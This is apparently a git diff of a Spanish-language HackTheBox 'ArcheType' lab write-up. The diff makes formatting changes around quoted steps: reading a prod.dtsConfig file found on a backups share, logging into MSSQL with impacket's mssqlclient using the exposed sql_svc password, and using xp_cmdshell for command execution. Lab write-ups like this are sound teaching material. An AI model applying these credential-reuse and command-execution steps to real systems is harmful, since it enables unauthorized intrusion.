@@ -1,5 +1,5 @@
 ---
-title: "HackTheBox - ArcheType (Starting-Point)"
+title: "HackTheBox - ArcheType (SP)"
 layout: single
 excerpt: En esta ocasión traigo el Write Up de la máquina ArcheType de HackTheBox, a mi parecer es una máquina notable para personas que están empezando en Directorio Activo y el hacking en Windows.
 header:
@@ -165,7 +165,8 @@ SMB1 disabled -- no workgroup available
 Vi que existía una carpeta llamada backups, me llamo la atención y quise ver si tenía acceso a su contenido, pude ver que tenía y encontré un archivo DTS que tenía código XML "**prod.dts.Config**", lo abrí y me encontré con lo siguiente.
 
 ```xml
-cat prod.dtsConfig 
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ cat prod.dtsConfig 
 <DTSConfiguration>
     <DTSConfigurationHeading>
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
@@ -187,7 +188,7 @@ SMB         10.10.10.27     445    ARCHETYPE        [+] Archetype\ARCHETYPE:M3g4
 
 Viendo que el archivo es DTS y tenía código XML pensé en que la contraseña podía ser de una base de datos, para ello hice uso de la herramienta mssqlclient para ver si tenía acceso de autenticación.
 
-```python3
+```python
 ┌─[root@parrot]─[/home/wackyhacker/Desktop]
 └──╼ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -206,7 +207,7 @@ SQL>
 
 Y efectivamente accedí, tenía la capacidad de ejecutar comandos gracias a la utilidad xp_cmdshell.
 
-```python3 
+```python
 ┌─[root@parrot]─[/home/wackyhacker/Desktop]
 └──╼ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
